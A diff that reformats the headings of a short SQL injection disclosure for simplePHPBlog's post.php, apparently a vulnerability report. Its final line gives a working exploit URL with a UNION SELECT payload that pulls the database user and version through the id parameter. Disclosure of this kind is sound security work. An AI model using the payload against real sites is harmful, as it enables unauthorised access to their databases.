@@ -1,10 +1,10 @@
-#simplePHPBlog SQL injection#
+# simplePHPBlog SQL injection #
 
-##Vulnerability link##
+## Vulnerability link ##
 
 https://github.com/ajamous/simplePHPBlog
 
-##Vulnerability details##
+## Vulnerability details ##
 
 post.php
 
@@ -43,6 +43,6 @@ In this code `id` use `mysqli_real_escape_string` but in sql query `$query = 'SE
 
 
  
-##exploit:##
+## exploit: ##
 
 http://target/post.php?id=-1 union select 1,2,user(),version(),5
